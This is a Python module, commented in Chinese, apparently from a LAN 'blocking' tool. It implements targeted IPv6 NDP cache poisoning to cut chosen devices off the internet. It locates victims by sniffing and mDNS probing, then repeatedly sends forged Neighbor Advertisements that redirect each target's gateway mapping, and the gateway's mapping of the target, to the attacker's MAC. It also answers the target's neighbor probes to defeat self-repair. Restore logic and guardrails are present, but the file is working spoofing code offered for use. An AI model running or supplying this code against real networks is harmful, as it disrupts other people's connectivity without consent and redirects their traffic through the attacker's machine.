"""IPv6 / NDP 支持层。

为什么需要这一层
----------------
ARP 只管 IPv4。现代家庭网络普遍存在全局 IPv6（运营商 RA 下发），
双栈设备访问同样双栈的网站时会优先走 IPv6（RFC 6724），
这些数据帧直接发往路由器的真实 MAC，根本不经过投毒方 ——
于是「界面显示阻断中，目标照常上网」。

本模块用 NDP（邻居发现）做定向投毒，把目标缓存里的「默认网关 ↔ MAC」
改成本机，从而真正切断经网关的出站流量。

三条边界写死在代码里，不只写在文档里
------------------------------------
1. 只阻断「经默认网关的出站」。同一链路上的 IPv6 直连
   （投屏、AirDrop、局域网互传）不受影响，也拦不住。
2. 只发单播 NA。`_send()` 会拒绝任何组播/广播目的 MAC ——
   一旦发到 ff02::1，全网的网关映射都会被改掉，包括运行本程序的机器。
3. 默认关闭 + 多目标并发（每目标独立护栏，任一目标自检失败只回滚自己）。
"""

from __future__ import annotations

import ipaddress
import re
import threading
import time
from dataclasses import dataclass, field

import core

MULTICAST_MAC_PREFIX = 0x01          # 首字节最低位为 1 即组播/广播
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
ALL_NODES_MAC = "33:33:00:00:00:01"  # ff02::1 对应的二层地址，禁止发往
MDNS_MAC = "33:33:00:00:00:fb"

WATCHDOG_EVERY = 5          # 每 N 个周期做一次自检
WATCHDOG_FAILS = 2          # 连续失败多少次判定失控
MDNS_INTERVAL = 5           # mDNS 兜底时的重发次数上限


# ------------------------------------------------------------------ 环境探测


@dataclass
class V6Env:
    """本机与所在网段的 IPv6 上下文。"""

    supported: bool = False          # 网卡上是否启用了 IPv6
    gw_lla: str = ""                 # 默认网关的链路本地地址，如 fe80::1
    gw_mac: str = ""                 # 网关真实 MAC（从 IPv4 邻居表拿到）
    my_lla: str = ""                 # 本机链路本地地址
    my_globals: list[str] = field(default_factory=list)
    prefixes: list[str] = field(default_factory=list)   # 全局前缀，如 2409:8a55:.../64

    @property
    def dual_stack(self) -> bool:
        """本网段是否在跑可路由的 IPv6 —— 这是「需要提醒用户」的判据。"""
        return bool(self.supported and self.gw_lla and self.prefixes)


def _ipv6_layer():
    try:
        from scapy.layers.inet6 import IPv6
        return IPv6
    except Exception:
        return None


def probe_env(ni) -> V6Env:
    """只用 scapy 读系统 IPv6 路由表，不调用任何外部命令。

    conf.route6.route("::") 返回 (iface, 出站源地址, 网关)；
    conf.route6.routes 的每行带该路由下的本机地址列表。
    """
    env = V6Env()
    s = core.scapy_mod()
    if s is None or _ipv6_layer() is None:
        return env
    try:
        iface, src, gw = s.conf.route6.route("::")
    except Exception as e:
        core.LOG.emit("debug", f"IPv6 路由查询失败：{e}")
        return env

    if not gw or gw == "::":
        return env                      # 没有 IPv6 默认路由，等价于未启用

    env.supported = True
    env.gw_lla = gw

    try:
        for net, plen, _gw, rif, addrs, _metric in s.conf.route6.routes:
            if rif != iface:
                continue
            if net == "fe80::" and addrs:
                env.my_lla = addrs[0]
            elif net not in ("::", "::1") and not net.startswith("fe80"):
                try:
                    ipaddress.IPv6Address(net)
                except ValueError:
                    continue
                # /128 是给自己地址挂的主机路由，不是网段前缀，会让「有没有双栈」误判
                if plen < 128:
                    env.prefixes.append(f"{net}/{plen}")
            for a in addrs:
                if not a.startswith("fe80") and a != "::1":
                    if a not in env.my_globals:
                        env.my_globals.append(a)
    except Exception as e:
        core.LOG.emit("debug", f"IPv6 路由表解析异常：{e}")

    if not env.my_lla and src and src.startswith("fe80"):
        env.my_lla = src

    env.gw_mac = ni.gateway_mac or ""
    return env


# ------------------------------------------------------------------ LLA 探明


def sniff_llas(iface: str, seconds: float = 15.0,
               stop: threading.Event | None = None) -> dict[str, str]:
    """被动收集「MAC → 链路本地地址」。

    零干扰：只读不发。代价是目标在窗口期内不说话就探不到（手机会待机）。
    """
    s = core.scapy_mod()
    IPv6 = _ipv6_layer()
    if s is None or IPv6 is None:
        return {}
    found: dict[str, str] = {}

    def cb(p):
        try:
            if p.haslayer(s.Ether) and p.haslayer(IPv6):
                src = p[IPv6].src
                if src.lower().startswith("fe80"):
                    found[p[s.Ether].src.lower()] = src
        except Exception:
            pass

    sn = None
    try:
        sn = s.AsyncSniffer(iface=iface, prn=cb, store=False, filter="ip6")
        sn.start()
        deadline = time.time() + seconds
        while time.time() < deadline:
            if stop is not None and stop.is_set():
                break
            time.sleep(0.2)
    except Exception as e:
        core.LOG.emit("debug", f"被动嗅探失败：{e}")
    finally:
        if sn is not None:
            try:
                sn.stop()
            except Exception:
                pass
    return found


def build_mdns_query(my_lla: str):
    """构造 mDNS 查询报文，务必带 QU 位（要求对方单播回应）。"""
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.l2 import Ether
    from scapy.layers.inet import UDP
    IPv6 = _ipv6_layer()

    qs = [DNSQR(qname=q, qtype="PTR", unicastresponse=1) for q in (
        "_services._dns-sd._udp.local",
        "_airplay._tcp.local",
        "_googlecast._tcp.local",
        "_http._tcp.local",
    )]
    return (Ether(dst=MDNS_MAC)
            / IPv6(src=my_lla, dst="ff02::fb", hlim=255)
            / UDP(sport=5353, dport=5353)
            / DNS(id=0, qr=0, qd=qs))


def mdns_probe(iface: str, my_lla: str, seconds: float = 5.0) -> dict[str, tuple[str, str]]:
    """主动问一句 mDNS，手机/电视基本都会回。

    返回 {mac: (lla, 主机名)}。这是被动嗅探探不到时的兜底。

    两个关键点：
    - QU 位必须用 `unicastresponse=1`。写 `qclass=0x8001` 会被 scapy 的位域
      吃掉，实际发出的是 0x1，对方便按组播回，而组播回包本机未必收得到。
    - 一次带多个服务类型提问，命中率比单问 `_services._dns-sd._udp` 高。
    """
    s = core.scapy_mod()
    IPv6 = _ipv6_layer()
    if s is None or IPv6 is None or not my_lla:
        return {}

    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.l2 import Ether
    from scapy.layers.inet import UDP

    found: dict[str, tuple[str, str]] = {}

    def cb(p):
        try:
            if not (p.haslayer(IPv6) and p.haslayer(DNS)):
                return
            src = p[IPv6].src
            if not src.lower().startswith("fe80") or src == my_lla:
                return
            mac = p[Ether].src.lower()
            name = ""
            dns = p[DNS]
            for rr in (dns.an or []):
                if isinstance(rr, DNSRR):
                    if isinstance(rr.rrname, bytes):
                        name = rr.rrname.decode("utf-8", "ignore")
                    else:
                        name = str(rr.rrname)
                    if name.endswith(".local."):
                        name = name[:-7]
                    elif name.endswith(".local"):
                        name = name[:-6]
                    break
            found.setdefault(mac, (src, name))
        except Exception:
            pass

    pkt = build_mdns_query(my_lla)

    sn = None
    try:
        sn = s.AsyncSniffer(iface=iface, prn=cb, store=False, filter="udp port 5353")
        sn.start()
        time.sleep(0.3)
        for _ in range(MDNS_INTERVAL):
            s.sendp(pkt, iface=iface, verbose=0)
            time.sleep(1.0)
    except Exception as e:
        core.LOG.emit("debug", f"mDNS 探测失败：{e}")
    finally:
        if sn is not None:
            try:
                sn.stop()
            except Exception:
                pass
    return found


def ndp_table() -> dict[str, str]:
    """读取本机 IPv6 邻居缓存，返回 {链路本地地址(去 zone): MAC}。

    仅用于「本机守护」的 NDP 漂移监测：把网关 LLA 当前的 MAC 与受信任基准比对。
    解析失败（无 ip 命令、netsh 异常）一律返回空 dict —— 监测是 best-effort，
    缺失时不报警，由周期性重宣告继续兜底防御。
    """
    table: dict[str, str] = {}
    _mac = re.compile(r"((?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})")
    _v6 = re.compile(r"([0-9a-fA-F:]+)(?:%\d+)?")
    if core.WINDOWS:
        out = core._run_hidden(["netsh", "interface", "ipv6", "show", "neighbors"], "gbk")
    else:
        out = core._run_hidden(["ip", "-6", "neigh"], "utf-8")
    if not out:
        return table
    for line in out.splitlines():
        m_v = _v6.search(line)
        m_m = _mac.search(line)
        if not (m_v and m_m):
            continue
        lla = m_v.group(1).split("%")[0].lower()
        mac = m_m.group(1).replace("-", ":").lower()
        if lla and mac:
            table[lla] = mac
    return table


def find_lla(iface: str, mac: str, my_lla: str,
             sniff_seconds: float = 15.0,
             stop: threading.Event | None = None) -> tuple[str, str]:
    """探明某台设备的链路本地地址。返回 (lla, 来源说明)。

    顺序：被动嗅探 → mDNS 兜底。两条都空则返回空串，由调用方降级。
    """
    mac = mac.lower()
    core.LOG.emit("info", f"探明 {mac} 的 IPv6 地址（被动嗅探 {sniff_seconds:.0f} 秒）…")
    hit = sniff_llas(iface, sniff_seconds, stop)
    if mac in hit:
        return hit[mac], "嗅探"

    core.LOG.emit("info", "被动嗅探未命中，改用 mDNS 主动询问…")
    md = mdns_probe(iface, my_lla)
    if mac in md:
        lla, name = md[mac]
        if name:
            core.LOG.emit("ok", f"mDNS 回应：{name} → {lla}")
        return lla, "mDNS"
    return "", "未探明"


# ------------------------------------------------------------------ 报文构造


def build_na(eth_src: str, eth_dst: str, ipv6_src: str, ipv6_dst: str,
             tgt: str, lladdr: str, solicited: int = 0):
    """构造一条邻居通告（NA）。

    tgt 与 lladdr 一起表达「tgt 这个地址现在在 lladdr 这个 MAC 上」。
    O=1 允许覆盖已有缓存项，这是投毒生效的关键位。
    """
    s = core.scapy_mod()
    IPv6 = _ipv6_layer()
    from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
    from scapy.layers.l2 import Ether

    return (Ether(src=eth_src, dst=eth_dst)
            / IPv6(src=ipv6_src, dst=ipv6_dst)
            / ICMPv6ND_NA(tgt=tgt, R=0, S=solicited, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=lladdr))


def build_ns_reply(eth_src: str, eth_dst: str, ipv6_src: str, ipv6_dst: str,
                   tgt: str, lladdr: str):
    """应答对方发来的 NS 时用的 NA：S=1（solicited），必须带目的链路层地址。"""
    return build_na(eth_src, eth_dst, ipv6_src, ipv6_dst, tgt, lladdr, solicited=1)


# ------------------------------------------------------------------ 定向阻断


class NdpBlocker:
    """对单个目标做定向 NDP 投毒。

    与 ARP 版本同构：周期重发 + 监听对方 NS 并代为应答（否则 NUD 会自我修复）
    + 退出时回填真实映射。
    """

    def __init__(self, ni, env: V6Env, target_ip: str, target_mac: str,
                 target_lla: str, interval: float = 1.0,
                 poison_gateway: bool = True):
        self.ni = ni
        self.env = env
        self.target_ip = target_ip
        self.target_mac = target_mac.lower()
        self.target_lla = target_lla
        self.interval = max(0.4, interval)
        self.poison_gateway = poison_gateway

        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._sniffer = None
        self._sent = 0
        self._cycles = 0
        self._fails = 0
        self.aborted = False
        self.abort_reason = ""
        self._lock = threading.Lock()
        # 会话代际 + 发送锁（第 11 轮）：与 core.Killer 同源的顺序保证——
        # stop(restore) 推进代际，让「还没检查代际的在途发送」作废；
        # 发送在 _send_lock 内排他，于是推进代际必然发生在当前 sendp 返回之后。
        # 缺了它，最后一批投毒帧可能落在恢复帧之后，目标残留 IPv6 被阻断。
        self._gen = 0
        self._send_lock = threading.RLock()
        self._late_sends = 0

    # ---------------------------------------------------------- 对外接口

    def preflight(self) -> tuple[bool, str]:
        """开工前的硬检查。任何一项不过就拒绝启动，不给「试试看」的机会。"""
        if not self.env.supported or not self.env.gw_lla:
            return False, "本机没有 IPv6 默认路由"
        if not self.env.gw_mac:
            return False, "拿不到网关 MAC，无法构造回填报文"
        if not self.target_lla:
            return False, "目标没有链路本地地址，无法定向投毒"
        if not _valid_mac(self.target_mac) or not _valid_mac(self.env.gw_mac):
            return False, "MAC 格式非法"
        # 结构化受保护校验（对抗性审查 N1）：目标就是网关自身时必须拒绝，
        # 这是与 NdpManager 互相独立的一道 —— 任何直接构造 NdpBlocker 的
        # 调用方都无法绕过。
        if self.target_lla.split("%")[0].lower() == self.env.gw_lla.split("%")[0].lower():
            return False, "目标 LLA 即网关自身（受保护设备），拒绝"
        if self.target_mac == self.env.gw_mac.lower():
            return False, "目标 MAC 即网关自身（受保护设备），拒绝"
        return True, "ok"

    def _bump_gen(self) -> int:
        """推进会话代际：等当前 sendp 返回后，让在途批次的剩余发送作废。"""
        with self._send_lock:
            self._gen += 1
            return self._gen

    def start(self) -> tuple[bool, str]:
        if self._thread is not None and self._thread.is_alive():
            return False, "该目标已有 IPv6 阻断线程在运行"
        ok, why = self.preflight()
        if not ok:
            return False, why
        self._stop.clear()
        self._sniffer = self._start_ns_sniffer()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        core.LOG.emit(
            "warn",
            f"IPv6 定向阻断已开启：{self.target_ip} / {self.target_lla}"
            f"（只影响经网关的出站流量）")
        return True, "ok"

    def stop(self, restore: bool = True) -> int:
        self._stop.set()
        self._bump_gen()          # 先作废在途发送，再等线程退出
        if self._thread is not None:
            self._thread.join(timeout=3.0)
            self._thread = None
        if self._sniffer is not None:
            try:
                self._sniffer.stop()
            except Exception:
                pass
            self._sniffer = None
        n = 0
        if restore:
            n = self._restore()
        return n

    def stats(self) -> dict:
        return {"sent": self._sent, "aborted": self.aborted,
                "reason": self.abort_reason}

    # ---------------------------------------------------------- 内部实现

    def _send(self, pkt, gen: int | None = None):
        """唯一发包出口。这里拒绝一切组播/广播目的地址。

        这是最后一道结构性保险：即使上层传错参数，
        也不可能把 NA 发到 ff02::1 把全家网络搞断。
        """
        dst = pkt["Ether"].dst.lower()
        first = int(dst.split(":")[0], 16)
        if dst == BROADCAST_MAC or (first & MULTICAST_MAC_PREFIX):
            raise core.BlockError(
                f"拒绝向组播/广播地址 {dst} 发送 NA —— 这会切断整网 IPv6")
        s = core.scapy_mod()
        with self._send_lock:
            if gen is not None and gen != self._gen:
                self._late_sends += 1
                return
            s.sendp(pkt, iface=self.ni.iface, verbose=0)
        with self._lock:
            self._sent += 1

    def _frames(self, restore: bool):
        """返回 (发给目标的帧, 发给网关的帧)。"""
        if restore:
            to_target = build_na(
                eth_src=self.env.gw_mac, eth_dst=self.target_mac,
                ipv6_src=self.env.gw_lla, ipv6_dst=self.target_lla,
                tgt=self.env.gw_lla, lladdr=self.env.gw_mac)
            to_gw = build_na(
                eth_src=self.target_mac, eth_dst=self.env.gw_mac,
                ipv6_src=self.target_lla, ipv6_dst=self.env.gw_lla,
                tgt=self.target_lla, lladdr=self.target_mac)
            return to_target, to_gw

        to_target = build_na(
            eth_src=self.ni.my_mac, eth_dst=self.target_mac,
            ipv6_src=self.env.gw_lla, ipv6_dst=self.target_lla,
            tgt=self.env.gw_lla, lladdr=self.ni.my_mac)
        to_gw = build_na(
            eth_src=self.ni.my_mac, eth_dst=self.env.gw_mac,
            ipv6_src=self.target_lla, ipv6_dst=self.env.gw_lla,
            tgt=self.target_lla, lladdr=self.ni.my_mac)
        return to_target, to_gw

    def _emit(self, restore: bool, gen: int | None = None):
        to_target, to_gw = self._frames(restore)
        self._send(to_target, gen)
        if self.poison_gateway:
            self._send(to_gw, gen)

    def _restore(self) -> int:
        """回填真实映射。多发几次，抵消丢包。"""
        n = 0
        for _ in range(5):
            try:
                self._emit(restore=True)
                n += 1
            except Exception as e:
                core.LOG.emit("warn", f"IPv6 回填失败：{e}")
                break
            time.sleep(0.12)
        return n

    def _start_ns_sniffer(self):
        """盯着目标发来的 NS，用 NA 代为应答。

        不做这一步，目标的 NUD 探测得不到回应，几十秒后会删缓存重新询问，
        真路由器一应答就自动恢复了。
        """
        s = core.scapy_mod()
        IPv6 = _ipv6_layer()
        from scapy.layers.inet6 import ICMPv6ND_NS
        from scapy.layers.l2 import Ether

        def cb(p):
            try:
                if not (p.haslayer(Ether) and p.haslayer(IPv6)
                        and p.haslayer(ICMPv6ND_NS)):
                    return
                if p[Ether].src.lower() != self.target_mac:
                    return
                if p[ICMPv6ND_NS].tgt != self.env.gw_lla:
                    return
                reply = build_ns_reply(
                    eth_src=self.ni.my_mac, eth_dst=self.target_mac,
                    ipv6_src=self.env.gw_lla, ipv6_dst=p[IPv6].src,
                    tgt=self.env.gw_lla, lladdr=self.ni.my_mac)
                self._send(reply)
                core.LOG.emit("debug", "已代为应答目标的 NUD 探测")
            except core.BlockError:
                raise
            except Exception:
                pass

        try:
            sn = s.AsyncSniffer(
                iface=self.ni.iface, prn=cb, store=False,
                filter="icmp6")
            sn.start()
            return sn
        except Exception as e:
            core.LOG.emit("warn", f"NS 监听启动失败：{e}")
            return None

    def _watchdog(self) -> bool:
        """检查本机到网关的 IPv6 是否仍然正常。

        只看一件事：本机邻居缓存里网关是否还指向真实 MAC。
        如果被自己改成了本机 MAC，说明误发了组播 NA，必须立刻停手。
        """
        mac = _neighbor_mac(self.env.gw_lla)
        if mac is None:
            return True                     # 查不到就认为正常，不误杀
        if mac.lower() == self.env.gw_mac.lower():
            return True
        self.abort_reason = (f"本机网关映射被改成 {mac}，"
                             f"疑似误发组播 NA，已自动停手并回填")
        return False

    def _loop(self):
        while not self._stop.is_set():
            gen = self._gen          # 每轮取当前代际：stop/移除后本轮剩余发送自动作废
            try:
                self._emit(restore=False, gen=gen)
            except core.BlockError as e:
                self.aborted = True
                self.abort_reason = str(e)
                core.LOG.emit("err", f"IPv6 阻断中止：{e}")
                break
            except Exception as e:
                core.LOG.emit("warn", f"IPv6 投毒发送失败：{e}")

            self._cycles += 1
            if self._cycles % WATCHDOG_EVERY == 0 and not self._watchdog():
                self.aborted = True
                core.LOG.emit("err", f"失控保护触发：{self.abort_reason}")
                break

            self._stop.wait(self.interval)

        if self.aborted:
            try:
                self._restore()
            except Exception:
                pass


# ------------------------------------------------------------------ 小工具


def _valid_mac(mac: str) -> bool:
    import re
    return bool(re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", (mac or "").lower()))


def _neighbor_mac(ipv6: str) -> str | None:
    """从系统邻居表查某个 IPv6 地址对应的 MAC。查不到返回 None。"""
    if not ipv6:
        return None
    import re
    import subprocess

    kwargs = {}
    if core.WINDOWS:
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    try:
        out = subprocess.run(["netsh", "interface", "ipv6", "show", "neighbors"],
                             capture_output=True, timeout=4, **kwargs)
    except Exception:
        return None
    return _parse_neighbors(out.stdout.decode("gbk", "ignore"), ipv6)


def _parse_neighbors(txt: str, want: str | None = None) -> str | None:
    """从 netsh 邻居表里取某个 IPv6 地址对应的 MAC。

    抽成纯函数是为了能在没有网卡的环境（CI）里用固定文本做断言。
    跳过 00:00:00:00:00:00，那是「无法访问」条目的占位。
    """
    import re
    for line in txt.splitlines():
        m = re.match(r"\s*([0-9a-fA-F:]{6,})\s+([0-9a-fA-F-]{17})\s+(\S+)", line)
        if not m:
            continue
        ip = m.group(1).lower()
        if want is not None and ip != want.lower():
            continue
        mac = m.group(2).replace("-", ":").lower()
        if mac == "00:00:00:00:00:00":
            continue
        return mac
    return None


# ------------------------------------------------------------------ 多目标管理

class NdpManager:
    """管理多个并发的 NdpBlocker，实现多目标 IPv6 阻断。

    与单实例相比，安全护栏逐目标独立生效、一个都不放松：
      - 每个 NdpBlocker.start() 内部的 preflight（网关/目标校验、LLA 探明）
      - 每个 NdpBlocker 自己的 watchdog（本机网关映射被改立即回滚）
      - _send 拒绝组播（MULTICAST_MAC_PREFIX 检查）—— 任一目标都不可能切断整网
    另加一层全局护栏：受保护设备（网关/本机）在这里就被拒，
    与 core.is_protected() 同源，作为 GUI 过滤之外的最后一道。
    """

    def __init__(self):
        self._blockers: dict[str, NdpBlocker] = {}
        self._lock = threading.Lock()

    def active_ips(self) -> list[str]:
        with self._lock:
            return [ip for ip, b in self._blockers.items() if b and not b.aborted]

    def add(self, ni, env: V6Env, dev, interval: float = 1.0,
            sniff_seconds: float = 12.0) -> tuple[bool, str]:
        """探明目标 LLA 并启动定向阻断。返回 (成功?, 信息)。"""
        dev_ip = getattr(dev, "ip", "?")
        if not (env and env.dual_stack):
            return False, "本网未检测到 IPv6，跳过 IPv6 阻断"
        # 结构化受保护校验（对抗性审查 N1）：不信任 note 标注 —— 直接比对
        # IP/MAC。note 可能缺失（扫描抖动、直接 API 调用），而 IP 或 MAC
        # 任一命中网关/本机都必须拒绝（与 core.Killer._is_protected_target 同源）。
        bad_ips = {getattr(ni, "gateway_ip", ""), getattr(ni, "my_ip", "")}
        bad_macs = {(getattr(ni, "gateway_mac", "") or "").lower(),
                    (getattr(ni, "my_mac", "") or "").lower()}
        if dev.ip in bad_ips or (getattr(dev, "mac", "") or "").lower() in bad_macs:
            return False, f"{dev_ip} 是受保护设备（网关/本机），IPv6 不可阻断"
        if getattr(dev, "note", "") in ("网关", "本机"):
            return False, f"{dev_ip} 是受保护设备（网关/本机），IPv6 不可阻断"

        lla, how = find_lla(ni.iface, dev.mac, env.my_lla, sniff_seconds=sniff_seconds)
        if not lla:
            return False, (f"未能探明 {dev_ip} 的 IPv6 地址（{how}）"
                           f"—— 该设备的 IPv6 流量未阻断")
        blocker = NdpBlocker(ni, env, dev.ip, dev.mac, lla, interval=interval)
        ok, why = blocker.start()
        if not ok:
            return False, f"IPv6 定向阻断未启动：{why}"
        with self._lock:
            old = self._blockers.pop(dev.ip, None)   # 同 IP 重复添加：先停旧实例，防空转泄漏
            self._blockers[dev.ip] = blocker
        if old is not None:
            try:
                old.stop(restore=True)
            except Exception:
                pass
        return True, f"IPv6 定向阻断已生效：{dev_ip} → {lla}（来源 {how}）"

    def remove(self, ip: str, restore: bool = True) -> int:
        with self._lock:
            b = self._blockers.pop(ip, None)
        if b:
            try:
                b.stop(restore=restore)
                return 1
            except Exception:
                return 0
        return 0

    def restore_all(self, restore: bool = True) -> int:
        with self._lock:
            items = list(self._blockers.items())
            self._blockers.clear()
        n = 0
        for ip, b in items:
            try:
                b.stop(restore=restore)
                n += 1
            except Exception:
                pass
        return n

    def any_aborted(self) -> bool:
        with self._lock:
            return any(b.aborted for b in self._blockers.values())

    def state_of(self, ip: str) -> str:
        """该 IP 的 IPv6 阻断状态：''（未阻断）/ 'ok'（双栈阻断）/ 'miss'（探明失败）。"""
        with self._lock:
            b = self._blockers.get(ip)
        if b is None:
            return ""
        return "miss" if b.aborted else "ok"
